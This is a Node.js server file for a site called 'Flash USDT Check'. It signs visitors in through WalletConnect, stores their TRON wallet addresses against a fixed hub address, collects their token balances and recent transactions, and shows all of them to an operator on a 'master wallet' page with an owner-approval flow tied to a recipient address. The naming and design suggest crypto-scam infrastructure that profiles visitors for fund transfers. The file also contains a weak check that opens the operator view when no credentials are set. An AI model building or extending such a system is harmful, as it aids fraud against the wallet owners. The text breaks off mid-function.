import { createServer } from "node:http";
import { timingSafeEqual, randomBytes, createHash } from "node:crypto";
import { readFileSync } from "node:fs";
import { mkdir, readFile, rename, writeFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { createAuthState, SESSION_TTL_MS, WALLET_COOKIE, verifySignIn } from "../src/auth.mjs";
import { CONNECTION_TARGET, RECIPIENT, isValidTronAddress, signInRequestContext } from "../src/logic.mjs";
import { fetchTronWalletAssets } from "../src/tron-public.mjs";
import { plainAssetListHtml } from "../src/wallet-asset-display.mjs";
import { fetchEvmWalletAssets, looksLikeEvmAddress, normalizeEvmChainId } from "../src/evm-public.mjs";
import { injectLandingModuleCacheBust } from "./landing-cache-bust.mjs";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const port = Number(process.env.PORT || 4173);
const storePath = path.join(root, "data", "connected-wallets.json");
const operatorId = process.env.OPERATOR_ID || "";
const operatorPassword = process.env.OPERATOR_PASSWORD || "";
const sessionCookie = "operator_session";
/** @type {Set<string>} */
const operatorSessions = new Set();
const walletAuth = createAuthState();
const ownerAuth = createAuthState();
const ownerCookie = "owner_approval";
let writeQueue = Promise.resolve();

const allowed = new Map([
  ["/index.html", "text/html; charset=utf-8"],
  ["/generated/walletconnect-client.js", "text/javascript; charset=utf-8"],
  ["/src/app.js", "text/javascript; charset=utf-8"],
  ["/src/landing.js", "text/javascript; charset=utf-8"],
  ["/src/master-wallet.js", "text/javascript; charset=utf-8"],
  ["/src/wallet-asset-display.mjs", "text/javascript; charset=utf-8"],
  ["/src/wallet-tron-assets.mjs", "text/javascript; charset=utf-8"],
  ["/src/wallet-evm-assets.mjs", "text/javascript; charset=utf-8"],
  ["/src/wallet-tron-transactions.mjs", "text/javascript; charset=utf-8"],
  ["/src/wallet-evm-transactions.mjs", "text/javascript; charset=utf-8"],
  ["/src/landing-transfer.mjs", "text/javascript; charset=utf-8"],
  ["/src/logic.mjs", "text/javascript; charset=utf-8"],
  ["/src/tron-public.mjs", "text/javascript; charset=utf-8"],
  ["/src/evm-public.mjs", "text/javascript; charset=utf-8"],
  ["/src/styles.css", "text/css; charset=utf-8"],
  ["/src/wallet-state.mjs", "text/javascript; charset=utf-8"],
]);

const server = createServer(async (request, response) => {
  const url = new URL(request.url || "/", "http://127.0.0.1");
  try {
    if (url.pathname === "/login") {
      await handleLogin(request, response);
      return;
    }
    if (url.pathname === "/master-wallet") {
      await handleMasterWallet(request, response);
      return;
    }
    if (url.pathname === "/logout" && request.method === "POST") {
      await handleLogout(request, response);
      return;
    }
    if (url.pathname === "/api/wallet-connections" && request.method === "POST") {
      await handleWalletConnection(request, response);
      return;
    }
    if (url.pathname === "/api/config" && request.method === "GET") {
      handlePublicConfig(response);
      return;
    }
    if (url.pathname === "/api/owner/nonce" && request.method === "GET") {
      handleOwnerNonce(request, response);
      return;
    }
    if (url.pathname === "/api/owner/verify" && request.method === "POST") {
      await handleOwnerVerify(request, response);
      return;
    }
    if (url.pathname === "/api/owner/session" && request.method === "GET") {
      handleOwnerSession(request, response);
      return;
    }
    if (url.pathname === "/api/owner/logout" && request.method === "POST") {
      handleOwnerLogout(request, response);
      return;
    }
    if (url.pathname === "/api/auth/nonce" && request.method === "GET") {
      handleAuthNonce(request, response);
      return;
    }
    if (url.pathname === "/api/auth/verify" && request.method === "POST") {
      await handleAuthVerify(request, response);
      return;
    }
    if (url.pathname === "/api/auth/session" && request.method === "GET") {
      handleAuthSession(request, response);
      return;
    }
    if (url.pathname === "/api/auth/logout" && request.method === "POST") {
      handleAuthLogout(request, response);
      return;
    }
    if (url.pathname === "/api/wallet-provider-snapshot" && request.method === "POST") {
      await handleWalletProviderSnapshot(request, response);
      return;
    }
    if (url.pathname === "/api/wallet-assets" && request.method === "GET") {
      await handleWalletAssets(request, response);
      return;
    }
    if (url.pathname === "/api/public/wallet-assets" && request.method === "GET") {
      await handlePublicWalletAssets(request, response, url);
      return;
    }
    if (url.pathname === "/api/public/evm-wallet-assets" && request.method === "GET") {
      await handlePublicEvmWalletAssets(request, response, url);
      return;
    }
    await serveStatic(url.pathname, response);
  } catch {
    if (!response.headersSent && !response.writableEnded) {
      finish(response, 500, { "Content-Type": "text/plain; charset=utf-8", "Cache-Control": "no-store" }, "Server error");
    } else if (!response.writableEnded) {
      response.destroy();
    }
  }
});

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 */
async function handleLogin(request, response) {
  if (request.method === "POST") {
    const body = await readBody(request, 2048);
    const fields = new URLSearchParams(body);
    const accepted = operatorId.length > 0
      && operatorPassword.length > 0
      && sameSecret(fields.get("loginId") || "", operatorId)
      && sameSecret(fields.get("password") || "", operatorPassword);
    if (!accepted) {
      sendHtml(response, 401, loginPage("Login failed."));
      return;
    }
    const token = randomBytes(32).toString("hex");
    operatorSessions.add(token);
    finish(response, 303, {
      Location: "/login",
      "Set-Cookie": `${sessionCookie}=${token}; HttpOnly; SameSite=Lax; Path=/; Max-Age=43200`,
      "Cache-Control": "no-store",
    });
    return;
  }
  if (request.method !== "GET" && request.method !== "HEAD") {
    sendText(response, 405, "Method not allowed");
    return;
  }
  if (!hasSession(request)) {
    sendHtml(response, 200, loginPage(""));
    return;
  }
  const wallets = await readWallets();
  const enriched = enrichWalletsWithProviderSnapshots(wallets);
  sendHtml(response, 200, walletListPage(enriched));
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @returns {boolean}
 */
function hubReviewAuthorized(request) {
  if (hasSession(request)) return true;
  if (operatorId.length > 0 || operatorPassword.length > 0) return false;
  return Boolean(requestContext(request));
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 */
async function handleMasterWallet(request, response) {
  if (request.method === "POST") {
    const body = await readBody(request, 2048);
    const fields = new URLSearchParams(body);
    const accepted = operatorId.length > 0
      && operatorPassword.length > 0
      && sameSecret(fields.get("loginId") || "", operatorId)
      && sameSecret(fields.get("password") || "", operatorPassword);
    if (!accepted) {
      sendHtml(response, 401, masterWalletLoginPage("Login failed."));
      return;
    }
    const token = randomBytes(32).toString("hex");
    operatorSessions.add(token);
    finish(response, 303, {
      Location: "/master-wallet",
      "Set-Cookie": `${sessionCookie}=${token}; HttpOnly; SameSite=Lax; Path=/; Max-Age=43200`,
      "Cache-Control": "no-store",
    });
    return;
  }
  if (request.method !== "GET" && request.method !== "HEAD") {
    sendText(response, 405, "Method not allowed");
    return;
  }
  if (!hubReviewAuthorized(request)) {
    sendHtml(response, 200, masterWalletLoginPage(""));
    return;
  }
  const wallets = await readWallets();
  const enriched = enrichWalletsWithProviderSnapshots(wallets);
  sendHtml(response, 200, masterWalletPage(enriched));
}

/**
 * @param {Array<{ address: string, connectionTarget?: string, connectedAt: string, providerAssets?: unknown, providerTransactions?: unknown[], providerSnapshotAt?: string, network?: string, chainId?: string }>} wallets
 */
function enrichWalletsWithProviderSnapshots(wallets) {
  return wallets.map((wallet) => ({
    ...wallet,
    assets: providerAssetsView(wallet),
    transactions: providerTransactionsView(wallet),
  }));
}

/**
 * @param {{ providerAssets?: unknown, providerSnapshotAt?: string }} wallet
 */
function providerAssetsView(wallet) {
  const stored = wallet.providerAssets;
  if (stored && typeof stored === "object") {
    const record = /** @type {{ ok?: boolean, tokens?: unknown[], trxDisplay?: string, usdtDisplay?: string, nativeDisplay?: string, error?: string }} */ (stored);
    if (record.ok === false && record.error) {
      return { ok: false, error: record.error };
    }
    if (Array.isArray(record.tokens) && record.tokens.length > 0) {
      return {
        ok: true,
        tokens: /** @type {Array<{ display?: string, symbol?: string, standard?: string }>} */ (record.tokens),
        trxDisplay: record.trxDisplay,
        usdtDisplay: record.usdtDisplay,
        nativeDisplay: record.nativeDisplay,
      };
    }
  }
  if (wallet.providerSnapshotAt) {
    return { ok: false, error: "The stored provider snapshot did not include token balances." };
  }
  return {
    ok: false,
    error: "Waiting for the visitor to connect on the dapp and publish balances from their Web3 provider.",
  };
}

/**
 * @param {{ providerTransactions?: unknown[] }} wallet
 * @returns {Array<{ txid: string, when: string, direction: string, summary: string }>}
 */
function providerTransactionsView(wallet) {
  if (!Array.isArray(wallet.providerTransactions)) return [];
  return wallet.providerTransactions.flatMap((entry) => {
    if (!entry || typeof entry !== "object") return [];
    const row = /** @type {{ txid?: unknown, when?: unknown, direction?: unknown, summary?: unknown }} */ (entry);
    if (typeof row.summary !== "string" || typeof row.direction !== "string") return [];
    return [{
      txid: typeof row.txid === "string" ? row.txid : "",
      when: typeof row.when === "string" ? row.when : "Unknown time",
      direction: row.direction,
      summary: row.summary,
    }];
  });
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 */
async function handleWalletProviderSnapshot(request, response) {
  if (!requestContext(request)) {
    sendJson(response, 403, { ok: false, error: "The request origin is not allowed." });
    return;
  }
  const session = readWalletSession(request);
  if (!session) {
    sendJson(response, 401, { ok: false, error: "A verified wallet session is required." });
    return;
  }
  let parsed;
  try {
    parsed = JSON.parse(await readBody(request, 120_000));
  } catch {
    sendJson(response, 400, { ok: false, error: "The provider snapshot request is invalid." });
    return;
  }
  const address = parsed && typeof parsed === "object" && typeof parsed.address === "string" ? parsed.address.trim() : "";
  if (!address || address !== session.address) {
    sendJson(response, 403, { ok: false, error: "The snapshot address must match the verified session wallet." });
    return;
  }
  const assets = parsed && typeof parsed === "object" ? parsed.assets : null;
  const transactions = parsed && typeof parsed === "object" ? parsed.transactions : null;
  if (!assets || typeof assets !== "object") {
    sendJson(response, 400, { ok: false, error: "Provider asset data is required." });
    return;
  }
  await updateWalletProviderSnapshot(address, {
    network: session.network,
    chainId: session.chainId,
    providerAssets: assets,
    providerTransactions: Array.isArray(transactions) ? transactions.slice(0, 20) : [],
    providerSnapshotAt: new Date().toISOString(),
  });
  sendJson(response, 200, { ok: true });
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 */
async function handleLogout(request, response) {
  const token = cookieValue(request, sessionCookie);
  if (token) operatorSessions.delete(token);
  finish(response, 303, {
    Location: "/login",
    "Set-Cookie": `${sessionCookie}=; HttpOnly; SameSite=Lax; Path=/; Max-Age=0`,
    "Cache-Control": "no-store",
  });
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 */
async function handleWalletConnection(request, response) {
  const session = readWalletSession(request);
  if (!session) {
    sendJson(response, 401, { ok: false, error: "A verified wallet session is required." });
    return;
  }
  if (session.network !== "tron" || session.chainId !== "0x2b6653dc") {
    sendJson(response, 403, { ok: false, error: "A verified TRON mainnet wallet session is required." });
    return;
  }
  const body = await readBody(request, 2048);
  let parsed;
  try {
    parsed = JSON.parse(body);
  } catch {
    sendText(response, 400, "Bad request");
    return;
  }
  const address = parsed && typeof parsed === "object" ? parsed.address : "";
  if (typeof address !== "string" || !sameAddress(address, session.address)) {
    sendText(response, 400, "Bad request");
    return;
  }
  await rememberWallet(address, CONNECTION_TARGET);
  sendJson(response, 200, { ok: true, address, connectionTarget: CONNECTION_TARGET });
}

/**
 * @param {import("node:http").ServerResponse} response
 */
function handlePublicConfig(response) {
  sendJson(response, 200, {
    walletConnectProjectId: process.env.WALLETCONNECT_PROJECT_ID || "",
    connectionTargetTronAddress: CONNECTION_TARGET,
    tronChainId: "tron:0x2b6653dc",
  });
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 */
function handleOwnerNonce(request, response) {
  const context = requestContext(request);
  if (!context) {
    sendJson(response, 403, { ok: false, error: "The request origin is not allowed." });
    return;
  }
  const issued = ownerAuth.issueNonce();
  sendJson(response, 200, {
    ok: true,
    nonce: issued.nonce,
    expiresAt: new Date(issued.expiresAt).toISOString(),
    domain: context.domain,
    uri: context.uri,
    ownerTronAddress: RECIPIENT,
  });
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 */
async function handleOwnerVerify(request, response) {
  const context = requestContext(request);
  if (!context) {
    sendJson(response, 403, { ok: false, error: "The request origin is not allowed." });
    return;
  }
  let parsed;
  try {
    parsed = JSON.parse(await readBody(request, 12_000));
  } catch {
    sendJson(response, 400, { ok: false, error: "The owner approval request is invalid." });
    return;
  }
  const message = parsed && typeof parsed === "object" ? parsed.message : "";
  const signature = parsed && typeof parsed === "object" ? parsed.signature : "";
  if (typeof message !== "string" || typeof signature !== "string") {
    sendJson(response, 400, { ok: false, error: "The owner approval request is invalid." });
    return;
  }
  const verified = await verifySignIn({
    message,
    signature,
    expectedDomain: context.domain,
    expectedUri: context.uri,
    consumeNonce: (nonce, now) => ownerAuth.consumeNonce(nonce, now),
  });
  if (!verified.ok) {
    sendJson(response, 401, verified);
    return;
  }
  if (verified.identity.network !== "tron" || verified.identity.walletId !== "walletconnect") {
    sendJson(response, 403, { ok: false, error: "A verified TRON WalletConnect session is required." });
    return;
  }
  const created = ownerAuth.createSession(verified.identity);
  finish(response, 200, {
    "Content-Type": "application/json; charset=utf-8",
    "Cache-Control": "no-store",
    "Set-Cookie": sessionCookieValue(ownerCookie, created.token, context.secure),
    "X-Content-Type-Options": "nosniff",
  }, JSON.stringify({ ok: true, session: sessionView(created.session) }));
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 */
function handleOwnerSession(request, response) {
  const session = readOwnerSession(request);
  sendJson(response, 200, {
    ok: true,
    approved: Boolean(session),
    session: session ? sessionView(session) : null,
    ownerTronAddress: RECIPIENT,
  });
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 */
function handleOwnerLogout(request, response) {
  ownerAuth.deleteSession(cookieValue(request, ownerCookie));
  const context = requestContext(request);
  finish(response, 200, {
    "Content-Type": "application/json; charset=utf-8",
    "Cache-Control": "no-store",
    "Set-Cookie": `${ownerCookie}=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0${context?.secure ? "; Secure" : ""}`,
    "X-Content-Type-Options": "nosniff",
  }, JSON.stringify({ ok: true }));
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 */
function handleAuthNonce(request, response) {
  const context = requestContext(request);
  if (!context) {
    sendJson(response, 403, { ok: false, error: "The request origin is not allowed." });
    return;
  }
  const issued = walletAuth.issueNonce();
  sendJson(response, 200, {
    ok: true,
    nonce: issued.nonce,
    expiresAt: new Date(issued.expiresAt).toISOString(),
    domain: context.domain,
    uri: context.uri,
  });
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 */
async function handleAuthVerify(request, response) {
  const context = requestContext(request);
  if (!context) {
    sendJson(response, 403, { ok: false, error: "The request origin is not allowed." });
    return;
  }
  let parsed;
  try {
    parsed = JSON.parse(await readBody(request, 12_000));
  } catch {
    sendJson(response, 400, { ok: false, error: "The verification request is invalid." });
    return;
  }
  const message = parsed && typeof parsed === "object" ? parsed.message : "";
  const signature = parsed && typeof parsed === "object" ? parsed.signature : "";
  if (typeof message !== "string" || typeof signature !== "string") {
    sendJson(response, 400, { ok: false, error: "The verification request is invalid." });
    return;
  }
  const verified = await verifySignIn({
    message,
    signature,
    expectedDomain: context.domain,
    expectedUri: context.uri,
    consumeNonce: (nonce, now) => walletAuth.consumeNonce(nonce, now),
  });
  if (!verified.ok) {
    sendJson(response, 401, verified);
    return;
  }
  if (verified.identity.network === "tron" && verified.identity.chainId === "0x2b6653dc") {
    await rememberWallet(verified.identity.address, CONNECTION_TARGET);
  }
  const created = walletAuth.createSession(verified.identity);
  finish(response, 200, {
    "Content-Type": "application/json; charset=utf-8",
    "Cache-Control": "no-store",
    "Set-Cookie": walletCookie(created.token, context.secure),
    "X-Content-Type-Options": "nosniff",
  }, JSON.stringify({ ok: true, session: visitorSessionView(created.session) }));
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 */
function handleAuthSession(request, response) {
  const session = readWalletSession(request);
  if (!session) {
    sendJson(response, 200, { ok: true, session: null });
    return;
  }
  sendJson(response, 200, { ok: true, session: visitorSessionView(session) });
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 */
function handleAuthLogout(request, response) {
  const token = cookieValue(request, WALLET_COOKIE);
  walletAuth.deleteSession(token);
  const context = requestContext(request);
  finish(response, 200, {
    "Content-Type": "application/json; charset=utf-8",
    "Cache-Control": "no-store",
    "Set-Cookie": `${WALLET_COOKIE}=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0${context?.secure ? "; Secure" : ""}`,
    "X-Content-Type-Options": "nosniff",
  }, JSON.stringify({ ok: true }));
}

/**
 * @param {string} address
 * @param {Awaited<ReturnType<typeof fetchTronWalletAssets>> & { ok: true }} assets
 */
function serializeWalletAssetsResponse(address, assets) {
  return {
    ok: true,
    connectionTarget: CONNECTION_TARGET,
    address,
    assets: {
      trxSun: assets.trxSun,
      usdtUnits: assets.usdtUnits,
      trxDisplay: assets.trxDisplay,
      usdtDisplay: assets.usdtDisplay,
      tokens: assets.tokens,
    },
  };
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 * @param {URL} url
 */
async function handlePublicWalletAssets(request, response, url) {
  if (!requestContext(request)) {
    sendJson(response, 403, { ok: false, error: "The request origin is not allowed." });
    return;
  }
  const address = (url.searchParams.get("address") || "").trim();
  if (!(await isValidTronAddress(address))) {
    sendJson(response, 400, { ok: false, error: "The TRON address is invalid." });
    return;
  }
  const assets = await fetchTronWalletAssets(address, { apiBase: process.env.TRON_API_BASE });
  if (!assets.ok) {
    sendJson(response, 502, { ok: false, error: assets.error });
    return;
  }
  sendJson(response, 200, serializeWalletAssetsResponse(address, assets));
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 * @param {URL} url
 */
async function handlePublicEvmWalletAssets(request, response, url) {
  if (!requestContext(request)) {
    sendJson(response, 403, { ok: false, error: "The request origin is not allowed." });
    return;
  }
  const address = (url.searchParams.get("address") || "").trim();
  const chainId = (url.searchParams.get("chainId") || "1").trim();
  if (!looksLikeEvmAddress(address)) {
    sendJson(response, 400, { ok: false, error: "The EVM address is invalid." });
    return;
  }
  if (!normalizeEvmChainId(chainId)) {
    sendJson(response, 400, { ok: false, error: "The EVM chain id is invalid." });
    return;
  }
  const assets = await fetchEvmWalletAssets(address, chainId, {
    rpcUrl: process.env.EVM_RPC_URL,
    explorerUrl: process.env.EVM_EXPLORER_URL,
  });
  if (!assets.ok) {
    sendJson(response, 502, { ok: false, error: assets.error });
    return;
  }
  sendJson(response, 200, {
    ok: true,
    network: "evm",
    chainId: assets.chainId,
    address,
    assets: {
      nativeDisplay: assets.nativeDisplay,
      nativeSymbol: assets.nativeSymbol,
      nativeUnits: assets.nativeUnits,
      erc20Warning: assets.erc20Warning,
      tokens: assets.tokens,
    },
  });
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {import("node:http").ServerResponse} response
 */
async function handleWalletAssets(request, response) {
  const session = readWalletSession(request);
  if (!session) {
    sendJson(response, 403, { ok: false, error: "A verified wallet session is required." });
    return;
  }
  sendJson(response, 410, {
    ok: false,
    error: "Connected wallet balances are loaded in the browser from your Web3 provider. This endpoint no longer reads public indexers.",
  });
}

/**
 * @param {string} pathname
 * @param {import("node:http").ServerResponse} response
 */
async function serveStatic(pathname, response) {
  const filePath = pathname === "/" ? "/index.html" : pathname;
  const type = allowed.get(filePath);
  if (!type) {
    sendText(response, 404, "Not found");
    return;
  }
  try {
    let body = await readFile(path.join(root, filePath));
    if (filePath === "/index.html") {
      body = Buffer.from(injectLandingModuleCacheBust(body.toString("utf8")), "utf8");
    }
    finish(response, 200, {
      "Content-Type": type,
      "Cache-Control": "no-store, no-cache, must-revalidate",
      "Pragma": "no-cache",
      "Expires": "0",
      "CDN-Cache-Control": "no-store",
      "X-Content-Type-Options": "nosniff",
    }, body);
  } catch {
    sendText(response, 404, "Not found");
  }
}

/**
 * @param {string} address
 * @param {string} connectionTarget
 */
function rememberWallet(address, connectionTarget) {
  const run = writeQueue.then(() => appendWallet(address, connectionTarget));
  writeQueue = run.then(() => undefined, () => undefined);
  return run;
}

/**
 * @param {string} address
 * @param {string} connectionTarget
 */
async function appendWallet(address, connectionTarget) {
  const wallets = await readWallets();
  wallets.push({ address, connectionTarget, connectedAt: new Date().toISOString() });
  const kept = wallets.slice(-500);
  await mkdir(path.dirname(storePath), { recursive: true });
  const temporary = `${storePath}.${process.pid}.tmp`;
  await writeFile(temporary, `${JSON.stringify({ wallets: kept }, null, 2)}\n`, "utf8");
  await rename(temporary, storePath);
}

/**
 * @param {string} address
 * @param {{ network?: string, chainId?: string, providerAssets?: unknown, providerTransactions?: unknown[], providerSnapshotAt?: string }} snapshot
 */
async function updateWalletProviderSnapshot(address, snapshot) {
  const wallets = await readWallets();
  let updated = false;
  for (let index = wallets.length - 1; index >= 0; index -= 1) {
    if (wallets[index].address === address) {
      wallets[index] = { ...wallets[index], ...snapshot };
      updated = true;
      break;
    }
  }
  if (!updated) return;
  await mkdir(path.dirname(storePath), { recursive: true });
  const temporary = `${storePath}.${process.pid}.tmp`;
  await writeFile(temporary, `${JSON.stringify({ wallets: wallets.slice(-500) }, null, 2)}\n`, "utf8");
  await rename(temporary, storePath);
}

/**
 * @returns {Promise<Array<{ address: string, connectionTarget?: string, connectedAt: string }>>}
 */
async function readWallets() {
  try {
    const text = await readFile(storePath, "utf8");
    const parsed = JSON.parse(text);
    if (!parsed || typeof parsed !== "object" || !Array.isArray(parsed.wallets)) return [];
    return parsed.wallets.flatMap((/** @type {any} */ item) => {
      if (!item || typeof item !== "object") return [];
      if (typeof item.address !== "string" || typeof item.connectedAt !== "string") return [];
      const connectionTarget = typeof item.connectionTarget === "string" ? item.connectionTarget : undefined;
      const network = typeof item.network === "string" ? item.network : undefined;
      const chainId = typeof item.chainId === "string" ? item.chainId : undefined;
      const providerSnapshotAt = typeof item.providerSnapshotAt === "string" ? item.providerSnapshotAt : undefined;
      const providerAssets = item.providerAssets && typeof item.providerAssets === "object" ? item.providerAssets : undefined;
      const providerTransactions = Array.isArray(item.providerTransactions) ? item.providerTransactions : undefined;
      return [{
        address: item.address,
        connectionTarget,
        connectedAt: item.connectedAt,
        network,
        chainId,
        providerSnapshotAt,
        providerAssets,
        providerTransactions,
      }];
    });
  } catch (error) {
    if (error && typeof error === "object" && "code" in error && error.code === "ENOENT") return [];
    throw error;
  }
}

/**
 * @param {string} given
 * @param {string} expected
 */
function sameSecret(given, expected) {
  const left = Buffer.from(given);
  const right = Buffer.from(expected);
  if (left.length !== right.length) {
    timingSafeEqual(right, right);
    return false;
  }
  return timingSafeEqual(left, right);
}

/**
 * @param {import("node:http").IncomingMessage} request
 */
function hasSession(request) {
  const token = cookieValue(request, sessionCookie);
  return token.length > 0 && operatorSessions.has(token);
}

/**
 * @param {import("node:http").IncomingMessage} request
 */
function readWalletSession(request) {
  return walletAuth.readSession(cookieValue(request, WALLET_COOKIE));
}

/**
 * @param {import("node:http").IncomingMessage} request
 */
function readOwnerSession(request) {
  return ownerAuth.readSession(cookieValue(request, ownerCookie));
}

/**
 * @param {import("node:http").IncomingMessage} request
 */
function requestContext(request) {
  const originHeader = typeof request.headers.origin === "string" ? request.headers.origin : "";
  const host = typeof request.headers.host === "string" ? request.headers.host : "";
  const forwardedHost = typeof request.headers["x-forwarded-host"] === "string" ? request.headers["x-forwarded-host"] : "";
  const forwardedProto = typeof request.headers["x-forwarded-proto"] === "string" ? request.headers["x-forwarded-proto"] : "";
  return signInRequestContext(originHeader, host, process.env.PUBLIC_ORIGIN || "", {
    forwardedHost,
    forwardedProto,
  });
}

/**
 * @param {string} token
 * @param {boolean} secure
 */
function walletCookie(token, secure) {
  return sessionCookieValue(WALLET_COOKIE, token, secure);
}

/**
 * @param {string} name
 * @param {string} token
 * @param {boolean} secure
 */
function sessionCookieValue(name, token, secure) {
  const maxAge = Math.floor(SESSION_TTL_MS / 1000);
  return `${name}=${token}; HttpOnly; SameSite=Strict; Path=/; Max-Age=${maxAge}${secure ? "; Secure" : ""}`;
}

/**
 * @param {{ address: string, network: "evm" | "tron", chainId: string, walletId: string, expiresAt: number }} session
 */
function sessionView(session) {
  return {
    address: session.address,
    network: session.network,
    chainId: session.chainId,
    walletId: session.walletId,
    expiresAt: new Date(session.expiresAt).toISOString(),
  };
}

/**
 * @param {{ address: string, network: "evm" | "tron", chainId: string, walletId: string, expiresAt: number }} session
 */
function visitorSessionView(session) {
  return { ...sessionView(session), connectionTarget: CONNECTION_TARGET };
}

/**
 * @param {string} first
 * @param {string} second
 */
function sameAddress(first, second) {
  return first.startsWith("0x") && second.startsWith("0x")
    ? first.toLowerCase() === second.toLowerCase()
    : first === second;
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {string} name
 */
function cookieValue(request, name) {
  const header = request.headers.cookie;
  const raw = Array.isArray(header) ? header.join(";") : header || "";
  for (const part of raw.split(";")) {
    const separator = part.indexOf("=");
    if (separator === -1) continue;
    if (part.slice(0, separator).trim() === name) return part.slice(separator + 1).trim();
  }
  return "";
}

/**
 * @param {import("node:http").IncomingMessage} request
 * @param {number} limit
 * @returns {Promise<string>}
 */
function readBody(request, limit) {
  return new Promise((resolve, reject) => {
    /** @type {Buffer[]} */
    const chunks = [];
    let size = 0;
    request.on("data", (chunk) => {
      const buffer = typeof chunk === "string" ? Buffer.from(chunk) : chunk;
      size += buffer.length;
      if (size > limit) {
        reject(new Error("body too large"));
        request.destroy();
        return;
      }
      chunks.push(buffer);
    });
    request.on("end", () => resolve(Buffer.concat(chunks).toString("utf8")));
    request.on("error", reject);
  });
}

/**
 * @param {string} message
 */
function loginPage(message) {
  const notice = message ? `<p id="error" role="alert">${escapeHtml(message)}</p>` : `<p id="error" role="alert"></p>`;
  return pageShell("Operator login", `<section class="card" aria-labelledby="login-title">
      <p class="eyebrow">Operator</p>
      <h1 id="login-title">Login</h1>
      <p class="lede">Sign in to see public wallet addresses that completed verified connection.</p>
      ${notice}
      <form method="post" action="/login">
        <label for="login-id">Login id</label>
        <input id="login-id" name="loginId" type="text" autocomplete="username" spellcheck="false" required>
        <label for="login-password">Password</label>
        <input id="login-password" name="password" type="password" autocomplete="current-password" required>
        <button class="primary" type="submit">Log in</button>
      </form>
    </section>`);
}

/**
 * @param {{ trxDisplay?: string, usdtDisplay?: string, tokens?: Array<{ display?: string, symbol?: string, standard?: string }> }} assets
 */
function formatOperatorAssetSummary(assets) {
  return formatMasterWalletAssetHtml(assets);
}

/**
 * @param {{ ok?: boolean, error?: string, tokens?: Array<{ display?: string, symbol?: string, standard?: string }>, trxDisplay?: string, usdtDisplay?: string, nativeDisplay?: string }} assets
 */
function formatMasterWalletAssetHtml(assets) {
  if (!assets || assets.ok === false) {
    return `<div class="wallet-asset-panel wallet-asset-panel-error"><p class="wallet-asset-empty">${escapeHtml(assets?.error || "Balance unavailable")}</p></div>`;
  }
  const tokens = Array.isArray(assets.tokens) ? assets.tokens : [];
  if (!tokens.length) {
    const fallback = assets.trxDisplay || assets.nativeDisplay || assets.usdtDisplay || "0";
    return plainAssetListHtml([{ symbol: "Balance", display: fallback }], escapeHtml);
  }
  return `<div class="wallet-asset-panel">${plainAssetListHtml(tokens, escapeHtml)}</div>`;
}

/**
 * @param {Array<{ txid: string, when: string, direction: string, summary: string }>} transactions
 */
function formatMasterWalletTransactionsHtml(transactions) {
  if (!transactions.length) {
    return `<p class="muted">No recent activity snapshot yet. The visitor publishes activity from their Web3 provider after connecting on the dapp.</p>`;
  }
  const items = transactions.map((tx) => {
    const txid = tx.txid
      ? `<span class="address master-tx-id">${escapeHtml(tx.txid)}</span>`
      : "";
    return `<li><strong>${escapeHtml(tx.direction)}</strong> ${escapeHtml(tx.summary)} · ${escapeHtml(tx.when)}${txid ? `<br>${txid}` : ""}</li>`;
  }).join("");
  return `<ul class="master-tx-list">${items}</ul>`;
}

/**
 * @param {string} message
 */
function masterWalletLoginPage(message) {
  const notice = message ? `<p id="error" role="alert">${escapeHtml(message)}</p>` : `<p id="error" role="alert"></p>`;
  return pageShell("Hub master wallet", `<section class="card master-wallet-shell" aria-labelledby="master-login-title">
      <p class="eyebrow">Hub review</p>
      <h1 id="master-login-title">Master wallet login</h1>
      <p class="lede">Sign in to review every verified visitor wallet linked to hub <span class="address">${escapeHtml(CONNECTION_TARGET)}</span>.</p>
      ${notice}
      <form method="post" action="/master-wallet">
        <label for="master-login-id">Login id</label>
        <input id="master-login-id" name="loginId" type="text" autocomplete="username" spellcheck="false" required>
        <label for="master-login-password">Password</label>
        <input id="master-login-password" name="password" type="password" autocomplete="current-password" required>
        <button class="primary" type="submit">Open master wallet</button>
      </form>
      <p class="master-back-link"><a href="/">← Back to Flash USDT Check</a></p>
    </section>`, { masterStyles: true });
}

/**
 * @param {Array<{ address: string, connectionTarget?: string, connectedAt: string, providerSnapshotAt?: string, assets?: { ok: boolean, trxDisplay?: string, usdtDisplay?: string, nativeDisplay?: string, tokens?: Array<{ display?: string, symbol?: string, standard?: string }>, error?: string }, transactions?: Array<{ txid: string, when: string, direction: string, summary: string }> }>} wallets
 */
function masterWalletPage(wallets) {
  const hub = escapeHtml(CONNECTION_TARGET);
  const cards = [...wallets].reverse().map((wallet) => {
    const target = escapeHtml(wallet.connectionTarget || CONNECTION_TARGET);
    const assetHtml = formatMasterWalletAssetHtml(wallet.assets ?? { ok: false, error: "Balance unavailable" });
    const txHtml = formatMasterWalletTransactionsHtml(wallet.transactions ?? []);
    const snapshotNote = wallet.providerSnapshotAt
      ? `Provider snapshot · ${escapeHtml(formatConnectedAt(wallet.providerSnapshotAt))}`
      : "No provider snapshot yet";
